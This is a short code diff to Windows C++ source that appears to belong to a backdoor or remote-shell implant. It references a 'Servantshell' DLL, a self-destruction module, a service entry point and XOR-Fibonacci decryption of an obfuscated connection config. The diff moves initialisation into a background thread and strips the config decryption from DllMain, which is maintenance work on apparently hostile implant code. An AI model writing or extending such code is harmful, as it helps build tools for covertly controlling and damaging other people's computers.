@@ -2,11 +2,11 @@
 //
 
 #include "stdafx.h"
+#include <process.h>
 #include <Winsock2.h>
 #include <ObjBase.h>
 #include "destruction/SelfDestruction.h"
 #include "../../common/BinNames.h"
-//#include "ProcessDetector.h"
 #include "shell.h"
 #include "tstring.h"
 #include "common.h"
@@ -154,6 +154,7 @@ void WINAPI ServiceHandler( DWORD dwCommand )
 		break;
 	}
 }
+void func1(void* p){ Init(FALSE); };
 
 void WINAPI Main( 
 	__in  DWORD dwArgc,
@@ -165,7 +166,9 @@ void WINAPI Main(
 	if (g_bService) hSrv = RegisterServiceCtrlHandler(svcname.c_str(), (LPHANDLER_FUNCTION)ServiceHandler );
 
 	SetStatus( SERVICE_START_PENDING, 0, 1 );
-	Init(FALSE);
+
+	_beginthread(func1,0,NULL);
+
 	SetStatus( SERVICE_RUNNING, 0, 0 );
 }
 
@@ -202,9 +205,6 @@ BOOL APIENTRY DllMain( HMODULE hModule,
 	{
 	case DLL_PROCESS_ATTACH:
 		g_hServantshell = hModule;
-#ifndef _DEBUG
-		XorFibonacciCrypt(((LPBYTE)&g_ConfigInfo) + sizeof(DWORD), sizeof(g_ConfigInfo) - sizeof(DWORD), ((LPBYTE)&g_ConfigInfo) + sizeof(DWORD), CONNECT_CONFIG_FACTOR1, CONNECT_CONFIG_FACTOR2);
-#endif
 		break;
 	case DLL_THREAD_ATTACH:
 		break;
